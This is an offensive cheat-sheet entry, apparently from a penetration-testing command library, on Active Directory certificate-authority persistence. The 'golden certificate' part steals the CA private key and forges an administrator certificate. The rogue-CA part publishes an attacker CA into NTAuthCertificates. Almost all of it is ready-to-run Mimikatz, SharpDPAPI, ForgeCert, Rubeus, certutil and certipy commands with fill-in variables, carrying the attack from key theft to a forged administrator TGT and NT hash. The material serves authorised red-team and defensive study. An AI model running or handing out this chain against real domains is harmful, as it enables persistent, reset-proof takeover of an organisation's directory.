---
technique: CA Persistence (DPERSIST1 / DPERSIST2)
category: adcs-persistence
targets: Certificate Authority, NTAuthCertificates
protocols: Kerberos, LDAP
remote_capable: true
tags: adcs persistence ca-private-key stolen-ca rogue-ca ntauthcertificates forge dpersist
---

# CA Persistence (DPERSIST1 / DPERSIST2)

Two CA-based persistence techniques: DPERSIST1 steals the CA private key and forges certificates signed by the legitimate CA (golden certificates). DPERSIST2 installs a rogue CA certificate into the domain's trusted store (NTAuthCertificates), allowing forged certs signed by the rogue key to be accepted. Both survive admin password resets and persist until the CA certificate is revoked or rotated.

## Windows

### Mimikatz: export CA private key (DPERSIST1)

#powershell #mimikatz #dpapi #local

Unlock CAPI and CNG on the CA server and export all machine certificates including the CA private key; requires local admin on the CA host.

```powershell title:"DPERSIST1: export CA private key with Mimikatz"
.\mimikatz.exe "crypto::capi" "crypto::cng" "crypto::certificates /export"
```
<!-- cheat
import domain_ip
-->

### SharpDPAPI: extract CA cert (DPERSIST1)

#powershell #sharpdpapi #dpapi #local

Extract machine DPAPI secrets to get the CA cert and key.

```powershell title:"DPERSIST1: extract CA cert with SharpDPAPI"
.\SharpDPAPI.exe certificates /machine
```
<!-- cheat
import domain_ip
-->

### openssl: convert CA cert to PFX (DPERSIST1)

#powershell #openssl #dpapi #local

Convert the extracted CA PEM into a PFX usable for forging.

```powershell title:"DPERSIST1: convert extracted CA PEM to PFX"
openssl.exe pkcs12 -in "ca.pem" -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out "ca.pfx"
```
<!-- cheat
import domain_ip
-->

### ForgeCert: forge cert from stolen CA (DPERSIST1)

#powershell #forgecert #forge

Sign a new certificate with the stolen CA PFX to impersonate any principal.

```powershell title:"DPERSIST1: forge cert with ForgeCert"
.\ForgeCert.exe --CaCertPath "$ca_pfx" --CaCertPassword "$ca_pfx_pass" --Subject "CN=$target_user" --SubjectAltName "administrator@$domain" --NewCertPath "administrator.pfx" --NewCertPassword "$new_pfx_pass"
```
<!-- cheat
import domain_ip
import users
var ca_pfx
var ca_pfx_pass
var target_user
var new_pfx_pass
-->

### Rubeus: request TGT with forged cert (DPERSIST1)

#powershell #rubeus #pkinit

Request a TGT with the forged administrator certificate.

```powershell title:"DPERSIST1: request TGT with forged administrator cert"
.\Rubeus.exe asktgt /user:Administrator /certificate:administrator.pfx /password:"$new_pfx_pass" /domain:"$domain" /dc:"$dc_name" /show /nowrap
```
<!-- cheat
import domain_ip
var new_pfx_pass
var dc_name
-->

### certutil: install rogue CA (DPERSIST2)

#powershell #certutil #rogue-ca #ntauthcertificates

Publish a rogue self-signed CA certificate into the domain's NTAuthCertificates object so that certs signed by the rogue CA are trusted for authentication.

```powershell title:"DPERSIST2: publish rogue CA to NTAuthCertificates"
certutil.exe -dspublish -f "$rogue_ca_cert" NTAuthCA
```
<!-- cheat
import domain_ip
import users
var rogue_ca_cert
-->

## Linux

### certipy ca: backup CA key (DPERSIST1)

#certipy #dpapi #remote #ca-backup

Remotely extract the DPAPI-protected CA private key and certificate from the CA server.

```sh title:"DPERSIST1: remote CA private key backup with certipy"
certipy ca -u $user@$domain $auth_flags -dc-ip $rhost_ip -target $ca_fqdn -ca $ca_name -backup
```
<!-- cheat
import domain_ip
import users
import certipy_auth
var ca_fqdn
var ca_name
-->

### certipy forge: forge cert from stolen CA (DPERSIST1)

#certipy #forge #offline #san

Forge a certificate offline with the stolen CA.pfx, specifying any target UPN.

```sh title:"DPERSIST1: forge cert offline as administrator"
certipy forge -ca-pfx $ca_pfx -upn administrator@$domain -subject "$target_subject" -out administrator.pfx
```
<!-- cheat
import domain_ip
import users
var ca_pfx
var target_subject
-->

### certipy auth: authenticate with forged cert (DPERSIST1)

#certipy #pkinit #auth

Authenticate with the forged administrator certificate to get a TGT and NT hash.

```sh title:"DPERSIST1: authenticate with forged administrator cert"
certipy auth -pfx administrator.pfx -username administrator@$domain -dc-ip $rhost_ip
```
<!-- cheat
import domain_ip
-->
